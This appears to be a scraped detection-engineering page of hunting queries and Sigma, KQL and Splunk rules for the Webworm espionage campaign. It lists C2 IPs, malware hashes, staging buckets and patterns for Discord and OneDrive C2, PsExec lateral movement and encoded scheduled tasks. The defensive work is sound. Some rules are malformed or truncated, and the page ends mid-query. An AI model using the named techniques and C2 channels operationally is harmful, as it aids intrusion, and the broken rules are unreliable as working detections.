Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → PowerShell encoded / obfuscated command · Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — Webworm: New burrowing techniques
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → Scheduled task created with suspicious image / encoded args · RMM tool installed by non-IT user — remote-access utility for hands-on-keyboard · File hash IOCs — endpoint file/process match
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] EchoCreep Discord API beacon from non-browser process (Webworm 2025) · [LLM] GraphWorm OneDrive /createUploadSession C2 from non-Office process · [LLM] Webworm 2025 IOC match — known C2 IPs (Vultr/IT7) and file hashes · Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] WormFrp / Webworm Amazon S3 staging bucket access (wamanharipethe / whpjewellers) · Remote service execution — PsExec / SMB lateral movement
[LLM] EchoCreep Discord API beacon from non-browser process (Webworm 2025) Command & Control High
Hunts the EchoCreep backdoor's Discord-based C2 channel: a script interpreter or non-browser process beaconing to discord.com / discordapp.com API endpoints to upload files, fetch jobs, and run cmd.exe shell commands. ESET decrypted 400+ Discord messages and four guild/channel pairs tied to this campaign. Rationale: Article anchors EchoCreep to Discord API calls for upload/download/shell/sleep (Table 1) and explicitly states the backdoor's network traffic 'passes through Discord APIs using crafted HTTP requests'. Excluding the genuine Discord client + browsers leaves only the C2 path. Cross-checked Mandiant's Discord-C2 pattern guidance to confirm exclusion list. Cross-checked against: • https://attack.mitre.org/techniques/T1102/002/ • https://www.symantec-enterprise-blogs.security.com/threat-intelligence/webworm-espionage-rats
ATT&CKT1071.001 T1102.002 T1059.003
Data sourcesEndpoint.Processes Network_Traffic.All_Traffic
let LookbackDays = 7d;
DeviceNetworkEvents
| where Timestamp > ago(LookbackDays)
| where RemoteUrl has_any ("discord.com","discordapp.com","discord.gg","cdn.discordapp.com")
   or RemoteUrl has_any ("/api/v9/","/api/v10/")
| where InitiatingProcessFileName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe","iexplore.exe","Discord.exe","DiscordPTB.exe","DiscordCanary.exe","Spotify.exe","slack.exe","Teams.exe","ms-teams.exe","WebexTeams.exe")
| where InitiatingProcessAccountName !endswith "$"
| summarize ConnCount = count(),
            FirstSeen = min(Timestamp),
            LastSeen = max(Timestamp),
            SampleUrl = any(RemoteUrl),
            SampleCmd = any(InitiatingProcessCommandLine),
            DistinctRemoteIPs = dcount(RemoteIP)
          by DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessFolderPath
| where ConnCount >= 3
| order by FirstSeen desc
let LookbackDays = 7d;
let RecentInterpreters = SecurityEvent
    | where TimeGenerated > ago(LookbackDays)
    | where EventID == 4688
    | where NewProcessName has_any ("\\powershell.exe","\\pwsh.exe","\\cmd.exe","\\cscript.exe","\\wscript.exe","\\rundll32.exe","\\regsvr32.exe","\\mshta.exe","\\curl.exe","\\wget.exe")
    | where SubjectUserName !endswith "$"
    | project InterpreterTime=TimeGenerated, Computer, SubjectUserName, NewProcessName, CommandLine, NewProcessId;
let DiscordTraffic = ImNetworkSession
    | where TimeGenerated > ago(LookbackDays)
    | where DstHostname has_any ("discord.com","discordapp.com","discord.gg","cdn.discordapp.com")
       or Url has_any ("/api/v9/","/api/v10/","discord.com/api","discordapp.com/api")
    | project NetTime=TimeGenerated, DvcHostname, SrcUsername, SrcIpAddr, DstHostname, Url;
DiscordTraffic
| join kind=inner RecentInterpreters on $left.DvcHostname == $right.Computer
| where NetTime between (InterpreterTime .. InterpreterTime + 1h)
| summarize ConnCount=count(), FirstNet=min(NetTime), LastNet=max(NetTime), Interpreters=make_set(NewProcessName), SampleCmd=any(CommandLine), SampleUrl=any(Url)
        by DvcHostname, SubjectUserName, DstHostname
| where ConnCount >= 3
| order by FirstNet desc

[LLM] GraphWorm OneDrive /createUploadSession C2 from non-Office process Command & Control High
Hunts GraphWorm backdoor C2: Microsoft Graph API calls to /createUploadSession and victim-specific OneDrive directories from a non-Office, non-Edge process. ESET observed GraphWorm exclusively using OneDrive endpoints to fetch jobs and upload large staged files, with a separate directory per victim. Rationale: Article explicitly names the abused endpoint: 'the Microsoft Graph API endpoint /createUploadSession to upload large, staged files' and confines GraphWorm to OneDrive paths per-victim. Excluding native Office/OneDrive/Edge processes preserves the malicious signal while suppressing legit Graph use. Cross-referenced MITRE ATT&CK T1102.002 and Microsoft's Graph API consumer list. Cross-checked against: • https://attack.mitre.org/techniques/T1102/002/ • https://learn.microsoft.com/en-us/graph/api/driveitem-createuploadsession
ATT&CKT1102.002 T1567.002 T1071.001
Data sourcesEndpoint.Processes Network_Traffic.All_Traffic
let LookbackDays = 7d;
DeviceNetworkEvents
| where Timestamp > ago(LookbackDays)
| where RemoteUrl has "graph.microsoft.com"
   and (RemoteUrl has "createUploadSession" or RemoteUrl has "/me/drive/items" or RemoteUrl has "/drives/" or RemoteUrl has "/me/drive/root:")
| where InitiatingProcessFileName !in~ ("msedge.exe","chrome.exe","firefox.exe","OneDrive.exe","OneDriveStandaloneUpdater.exe","Teams.exe","ms-teams.exe","WINWORD.EXE","EXCEL.EXE","POWERPNT.EXE","OUTLOOK.EXE","ONENOTE.EXE","Outlook.exe","officeclicktorun.exe","backgroundtaskhost.exe")
| where InitiatingProcessAccountName !endswith "$"
| summarize ConnCount = count(),
            FirstSeen = min(Timestamp),
            LastSeen = max(Timestamp),
            SampleUrl = any(RemoteUrl),
            SampleCmd = any(InitiatingProcessCommandLine)
          by DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessFolderPath
| order by FirstSeen desc
let LookbackDays = 7d;
let RecentInterpreters = SecurityEvent
    | where TimeGenerated > ago(LookbackDays)
    | where EventID == 4688
    | where NewProcessName has_any ("\\powershell.exe","\\pwsh.exe","\\cmd.exe","\\rundll32.exe","\\regsvr32.exe","\\mshta.exe","\\cscript.exe","\\wscript.exe","\\curl.exe")
    | where SubjectUserName !endswith "$"
    | project InterpreterTime=TimeGenerated, Computer, SubjectUserName, NewProcessName, CommandLine;
let GraphTraffic = ImNetworkSession
    | where TimeGenerated > ago(LookbackDays)
    | where DstHostname has "graph.microsoft.com"
       and (Url has "createUploadSession" or Url has "/me/drive/items" or Url has "/drives/" or Url has "/me/drive/root:")
    | project NetTime=TimeGenerated, DvcHostname, SrcUsername, SrcIpAddr, DstHostname, Url;
GraphTraffic
| join kind=inner RecentInterpreters on $left.DvcHostname == $right.Computer
| where NetTime between (InterpreterTime .. InterpreterTime + 1h)
| summarize ConnCount=count(), FirstNet=min(NetTime), LastNet=max(NetTime), Interpreters=make_set(NewProcessName), SampleCmd=any(CommandLine), SampleUrl=any(Url)
        by DvcHostname, SubjectUserName, DstHostname
| order by FirstNet desc

[LLM] WormFrp / Webworm Amazon S3 staging bucket access (wamanharipethe / whpjewellers) Actions on Objectives High
Hunts contact with the compromised Amazon S3 buckets Webworm uses to stage configs, VM snapshots, mRemoteNG XMLs and SharpSecretsdump. Article names two buckets — wamanharipethe.s3.ap-south-1.amazonaws.com and whpjewellers.s3.amazonaws.com — used both for retrieving WormFrp configurations and exfiltrating data from victims in Italy and Spain. Rationale: Article cites exact bucket FQDNs (wamanharipethe.s3.ap-south-1.amazonaws.com and whpjewellers.s3.amazonaws.com). Any host in our estate touching these substrings is high-fidelity Webworm contact — the buckets are publicly documented IOCs taken down by ESET. No baseline exclusions needed. Cross-checked against: • https://www.welivesecurity.com/en/eset-research/webworm-new-burrowing-techniques/ • https://attack.mitre.org/techniques/T1567/002/
ATT&CKT1567.002 T1071.001 T1105
Data sourcesNetwork_Traffic.All_Traffic Network_Resolution.DNS Web.Web
let WebwormBuckets = dynamic(["wamanharipethe.s3.ap-south-1.amazonaws.com","whpjewellers.s3.amazonaws.com","wamanharipethe.s3.amazonaws.com"]);
let WebwormBucketSubstrings = dynamic(["wamanharipethe","whpjewellers"]);
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has_any (WebwormBucketSubstrings)
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort, ActionType
| union (
DeviceEvents
| where Timestamp > ago(30d)
| where ActionType == "DnsQueryResponse" or ActionType has "Dns"
| where AdditionalFields has_any (WebwormBucketSubstrings) or RemoteUrl has_any (WebwormBucketSubstrings)
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, RemoteUrl=coalesce(RemoteUrl,tostring(AdditionalFields)), RemoteIP, RemotePort=toint(0), ActionType
)
| order by Timestamp desc
let WebwormBucketSubstrings = dynamic(["wamanharipethe","whpjewellers"]);
union isfuzzy=true
(DnsEvents
| where TimeGenerated > ago(30d)
| where Name has_any (WebwormBucketSubstrings)
| project TimeGenerated, Source="DNS", Host=Computer, SrcIp=ClientIP, Destination=Name, Detail=tostring(QueryType)
),
(CommonSecurityLog
| where TimeGenerated > ago(30d)
| where DestinationHostName has_any (WebwormBucketSubstrings)
     or RequestURL has_any (WebwormBucketSubstrings)
     or DestinationDnsDomain has_any (WebwormBucketSubstrings)
| project TimeGenerated, Source=strcat(DeviceVendor,"/",DeviceProduct), Host=SourceHostName, SrcIp=SourceIP, Destination=coalesce(DestinationHostName,RequestURL), Detail=RequestURL
),
(ImNetworkSession
| where TimeGenerated > ago(30d)
| where DstHostname has_any (WebwormBucketSubstrings)
     or Url has_any (WebwormBucketSubstrings)
| project TimeGenerated, Source=strcat(EventVendor,"/",EventProduct), Host=DvcHostname, SrcIp=SrcIpAddr, Destination=DstHostname, Detail=Url
),
(ImWebSession
| where TimeGenerated > ago(30d)
| where HttpHostName has_any (WebwormBucketSubstrings)
     or Url has_any (WebwormBucketSubstrings)
| project TimeGenerated, Source=strcat(EventVendor,"/",EventProduct), Host=DvcHostname, SrcIp=SrcIpAddr, Destination=HttpHostName, Detail=Url
)
| order by TimeGenerated desc

[LLM] Webworm 2025 IOC match — known C2 IPs (Vultr/IT7) and file hashes Command & Control High
Atomic IOC match for the five Webworm C2 IPs (Vultr / IT7 Networks) and the six SHA1 hashes published by ESET for WormFrp, ChainWorm, SmuxProxy, WormSocket, EchoCreep, and GraphWorm samples observed in 2025. Rationale: Direct atomic IOC match on values published in the ESET article: five Vultr/IT7 C2 IPs and six SHA1 hashes. The article ties the Vultr/IT7 IP block to confirmed Webworm proxy/VPN infrastructure (article: 'All Webworm proxies and VPN services are cloud servers that belong to network infrastructure controlled by Vultr and IT7 Networks'). Zero baseline contact expected in a benign estate. Cross-checked against: • https://www.welivesecurity.com/en/eset-research/webworm-new-burrowing-techniques/ • https://symantec-enterprise-blogs.security.com/threat-intelligence/webworm-espionage-rats
ATT&CKT1071.001 T1090.001 T1572
Data sourcesNetwork_Traffic.All_Traffic Endpoint.Processes Endpoint.Filesystem
let WebwormIPs = dynamic(["45.77.13.67","64.176.85.158","104.243.23.43","108.61.200.151","144.168.60.233"]);
let WebwormHashes = dynamic(["CB4E50433336707381429707F59C3CBE8D497D98","1DF40A4A31B30B62EC33DC6FECC2C4408302ADC7","7DCFE9EE25841DFD58D3D6871BF867FE32141DFB","77F1970D620216C5FFF4E14A6CCC13FCCC267217","948159A7FC2E688386864BEA59FD40DFFC4B24D6","A3C077BDF8898E612CCD65BC82E7960834ADB2A9"]);
union
(DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteIP in (WebwormIPs)
| project Timestamp, DeviceName, IndicatorType="IP", Indicator=RemoteIP, RemotePort, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, InitiatingProcessAccountName
),
(DeviceFileEvents
| where Timestamp > ago(30d)
| where SHA1 in (WebwormHashes)
| project Timestamp, DeviceName, IndicatorType="SHA1", Indicator=SHA1, RemotePort=toint(0), InitiatingProcessFileName, InitiatingProcessFolderPath=FolderPath, InitiatingProcessCommandLine=InitiatingProcessCommandLine, InitiatingProcessAccountName
),
(DeviceProcessEvents
| where Timestamp > ago(30d)
| where SHA1 in (WebwormHashes) or InitiatingProcessSHA1 in (WebwormHashes)
| project Timestamp, DeviceName, IndicatorType="SHA1", Indicator=coalesce(SHA1,InitiatingProcessSHA1), RemotePort=toint(0), InitiatingProcessFileName=FileName, InitiatingProcessFolderPath=FolderPath, InitiatingProcessCommandLine=ProcessCommandLine, InitiatingProcessAccountName=AccountName
)
| order by Timestamp desc
let WebwormIPs = dynamic(["45.77.13.67","64.176.85.158","104.243.23.43","108.61.200.151","144.168.60.233"]);
let WebwormHashes = dynamic(["CB4E50433336707381429707F59C3CBE8D497D98","1DF40A4A31B30B62EC33DC6FECC2C4408302ADC7","7DCFE9EE25841DFD58D3D6871BF867FE32141DFB","77F1970D620216C5FFF4E14A6CCC13FCCC267217","948159A7FC2E688386864BEA59FD40DFFC4B24D6","A3C077BDF8898E612CCD65BC82E7960834ADB2A9"]);
union isfuzzy=true
(CommonSecurityLog
| where TimeGenerated > ago(30d)
| where DestinationIP in (WebwormIPs) or SourceIP in (WebwormIPs) or FileHash in (WebwormHashes)
| project TimeGenerated, Source=strcat(DeviceVendor,"/",DeviceProduct), Host=SourceHostName, IndicatorType=iff(DestinationIP in (WebwormIPs) or SourceIP in (WebwormIPs),"IP","Hash"), Indicator=iff(DestinationIP in (WebwormIPs),DestinationIP, iff(SourceIP in (WebwormIPs),SourceIP,FileHash)), Detail=strcat("port=",tostring(DestinationPort))
),
(ImNetworkSession
| where TimeGenerated > ago(30d)
| where DstIpAddr in (WebwormIPs) or SrcIpAddr in (WebwormIPs)
| project TimeGenerated, Source=strcat(EventVendor,"/",EventProduct), Host=DvcHostname, IndicatorType="IP", Indicator=iff(DstIpAddr in (WebwormIPs),DstIpAddr,SrcIpAddr), Detail=strcat("port=",tostring(DstPortNumber))
),
(ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileSHA1 in (WebwormHashes) or Hash in (WebwormHashes) or TargetFileSHA256 in (WebwormHashes)
| project TimeGenerated, Source=strcat(EventVendor,"/",EventProduct), Host=DvcHostname, IndicatorType="Hash", Indicator=coalesce(TargetFileSHA1,TargetFileSHA256,Hash), Detail=TargetFilePath
),
(ImProcessCreate
| where TimeGenerated > ago(30d)
| where SHA1 in (WebwormHashes) or Hash in (WebwormHashes) or SHA256 in (WebwormHashes)
| project TimeGenerated, Source=strcat(EventVendor,"/",EventProduct), Host=DvcHostname, IndicatorType="Hash", Indicator=coalesce(SHA1,SHA256,Hash), Detail=ActingProcessCommandLine
)
| order by TimeGenerated desc
title: Webworm 2025 Atomic IOC Match (C2 IPs + WormFrp/EchoCreep/GraphWorm hashes)
id: 73e2b8d4-9c87-4f31-bc14-aa67d6f1b9a2
description: Detects any host contact with the five Webworm Vultr/IT7 C2 IPs or any process/file matching the six published SHA1 hashes from the 2025 ESET campaign.
references:
  - https://www.welivesecurity.com/en/eset-research/webworm-new-burrowing-techniques/
author: SOC Detection Engineering
date: 2026/05/21
tags:

  - attack.t1090.001
  - attack.t1572

  category: process_creation
  product: windows

    Hashes|contains:
      - 'CB4E50433336707381429707F59C3CBE8D497D98'
      - '1DF40A4A31B30B62EC33DC6FECC2C4408302ADC7'
      - '7DCFE9EE25841DFD58D3D6871BF867FE32141DFB'
      - '77F1970D620216C5FFF4E14A6CCC13FCCC267217'
      - '948159A7FC2E688386864BEA59FD40DFFC4B24D6'
      - 'A3C077BDF8898E612CCD65BC82E7960834ADB2A9'

level: critical
(@network.destination.ip:(45.77.13.67 OR 64.176.85.158 OR 104.243.23.43 OR 108.61.200.151 OR 144.168.60.233) OR @DestinationIp:(45.77.13.67 OR 64.176.85.158 OR 104.243.23.43 OR 108.61.200.151 OR 144.168.60.233) OR @Hashes:(*CB4E50433336707381429707F59C3CBE8D497D98* OR *1DF40A4A31B30B62EC33DC6FECC2C4408302ADC7* OR *7DCFE9EE25841DFD58D3D6871BF867FE32141DFB* OR *77F1970D620216C5FFF4E14A6CCC13FCCC267217* OR *948159A7FC2E688386864BEA59FD40DFFC4B24D6* OR *A3C077BDF8898E612CCD65BC82E7960834ADB2A9*))
(#event_simpleName=NetworkConnectIP4 AND RemoteAddressIP4=/^(45\.77\.13\.67|64\.176\.85\.158|104\.243\.23\.43|108\.61\.200\.151|144\.168\.60\.233)$/)
OR (#event_simpleName=ProcessRollup2 AND SHA1HashData=/^(CB4E50433336707381429707F59C3CBE8D497D98|1DF40A4A31B30B62EC33DC6FECC2C4408302ADC7|7DCFE9EE25841DFD58D3D6871BF867FE32141DFB|77F1970D620216C5FFF4E14A6CCC13FCCC267217|948159A7FC2E688386864BEA59FD40DFFC4B24D6|A3C077BDF8898E612CCD65BC82E7960834ADB2A9)$/i)
OR (#event_simpleName=FileWritten AND SHA1HashData=/^(CB4E50433336707381429707F59C3CBE8D497D98|1DF40A4A31B30B62EC33DC6FECC2C4408302ADC7|7DCFE9EE25841DFD58D3D6871BF867FE32141DFB|77F1970D620216C5FFF4E14A6CCC13FCCC267217|948159A7FC2E688386864BEA59FD40DFFC4B24D6|A3C077BDF8898E612CCD65BC82E7960834ADB2A9)$/i)
| groupBy([aid, ComputerName, #event_simpleName], function=count())

| tstats summariesonly=false count from datamodel=Network_Traffic.All_Traffic where (All_Traffic.dest_ip IN ("45.77.13.67","64.176.85.158","104.243.23.43","108.61.200.151","144.168.60.233") OR All_Traffic.src_ip IN ("45.77.13.67","64.176.85.158","104.243.23.43","108.61.200.151","144.168.60.233")) by All_Traffic.src,All_Traffic.dest_ip,All_Traffic.dest_port,All_Traffic.user,All_Traffic.process_name,_time | `drop_dm_object_name(All_Traffic)` | append [ | tstats summariesonly=false count from datamodel=Endpoint.Filesystem where (Filesystem.file_hash IN ("CB4E50433336707381429707F59C3CBE8D497D98","1DF40A4A31B30B62EC33DC6FECC2C4408302ADC7","7DCFE9EE25841DFD58D3D6871BF867FE32141DFB","77F1970D620216C5FFF4E14A6CCC13FCCC267217","948159A7FC2E688386864BEA59FD40DFFC4B24D6","A3C077BDF8898E612CCD65BC82E7960834ADB2A9")) by Filesystem.dest,Filesystem.file_name,Filesystem.file_path,Filesystem.file_hash,_time | `drop_dm_object_name(Filesystem)` ] | append [ | tstats summariesonly=false count from datamodel=Endpoint.Processes where (Processes.process_hash IN ("CB4E50433336707381429707F59C3CBE8D497D98","1DF40A4A31B30B62EC33DC6FECC2C4408302ADC7","7DCFE9EE25841DFD58D3D6871BF867FE32141DFB","77F1970D620216C5FFF4E14A6CCC13FCCC267217","948159A7FC2E688386864BEA59FD40DFFC4B24D6","A3C077BDF8898E612CCD65BC82E7960834ADB2A9")) by Processes.dest,Processes.process_name,Processes.process_path,Processes.process_hash,Processes.user,_time | `drop_dm_object_name(Processes)` ]
Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

let BadIPs     = dynamic(["45.77.13.67", "64.176.85.158", "104.243.23.43", "108.61.200.151", "144.168.60.233"]);

title: Outbound Connection to Article-Named IP / Domain
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d0f
status: experimental
description: |
    Replace `__IP_LIST__` / `__DOMAIN_LIST__` placeholders with
    article-specific destinations. For dynamic IOC management, use a
    watchlist or external feed.
references:
    - https://attack.mitre.org/tactics/TA0011/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.command-and-control
logsource:

    product: windows
detection:
    selection_ip:

            - '__IP_PLACEHOLDER_1__'

    selection_domain:

            - '__DOMAIN_PLACEHOLDER_1__'
            - '__DOMAIN_PLACEHOLDER_2__'

falsepositives:
    - None on a true-positive IOC match

Asset exposure — vulnerability matches article CVE(s) Reconnaissance High
Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2017-7692")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2017-7692")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc
APPLICATION
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Vulnerabilities
    where Vulnerabilities.signature IN ("CVE-2017-7692")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Vulnerabilities
    where Vulnerabilities.signature IN ("CVE-2017-7692")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity
Remote service execution — PsExec / SMB lateral movement Actions on Objectives High
psexec / paexec / smbexec / wmic /node — service install over SMB from remote host.
ATT&CKT1021.002 T1569.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where FileName in~ ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
   or (FileName =~ "wmic.exe" and ProcessCommandLine has "/node:")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc

SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688            // process-create (audit-policy required)
| where Account !endswith "$"
| where NewProcessName endswith "\psexec.exe"
   or NewProcessName endswith "\psexesvc.exe"
   or NewProcessName endswith "\paexec.exe"
   or (NewProcessName endswith "\wmic.exe" and CommandLine has "/node:")
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

title: PsExec / SMB Lateral Movement Tooling Execution
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d03
status: experimental
description: |
    PsExec, paexec, smbexec, csexec, remcom — admin-grade tooling that
    pivots over SMB. Pair with `wmic /node:` for the full cluster.
references:
    - https://attack.mitre.org/techniques/T1021/002/
    - https://attack.mitre.org/techniques/T1569/002/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1021.002
    - attack.t1569.002
    - attack.lateral-movement
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:
    selection_psexec:
        Image|endswith:
            - '\psexec.exe'
            - '\psexec64.exe'
            - '\psexesvc.exe'
            - '\paexec.exe'
            - '\csexec.exe'
            - '\remcom.exe'
            - '\smbexec.py'
    selection_wmic_remote:
        Image|endswith:
            - '\wmic.exe'
        CommandLine|contains:
            - '/node:'
    condition: selection_psexec or selection_wmic_remote
falsepositives:
    - Sysadmins running approved remote-management tooling — wrap with
      a known-admin-host watchlist
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
       OR (Processes.process_name="wmic.exe" AND Processes.process="*/node:*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
       OR (Processes.process_name="wmic.exe" AND Processes.process="*/node:*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
Scheduled task created with suspicious image / encoded args Installation High
schtasks.exe /create or Microsoft-Windows-TaskScheduler EventID 4698 with LOLBin actions.
ATT&CKT1053.005
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where FileName =~ "schtasks.exe"
| where ProcessCommandLine has "/create"
| where ProcessCommandLine has_any ("powershell","cmd.exe","rundll32","-enc","FromBase64","\Users\Public","\AppData\")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where NewProcessName endswith "\schtasks.exe"
| where CommandLine has "/create"
| where CommandLine has_any ("powershell","cmd.exe","rundll32","-enc","FromBase64",
                              "\Users\Public", "\AppData\")
| project TimeGenerated, Computer, Account, CommandLine,
          ParentProcessName, NewProcessName
| order by TimeGenerated desc

title: Scheduled Task Creation with Suspicious Image / Encoded Args
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d0d
status: experimental
description: |
    schtasks.exe /create with payload-shaped action — points at
    powershell, cmd, rundll32, encoded-base64, or user-writable paths.
references:
    - https://attack.mitre.org/techniques/T1053/005/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1053.005
    - attack.persistence
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:
    selection_schtasks:
        Image|endswith: '\schtasks.exe'
        CommandLine|contains: '/create'
    selection_payload:
        CommandLine|contains:
            - 'powershell'
            - 'cmd.exe'
            - 'rundll32'
            - '-enc'

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
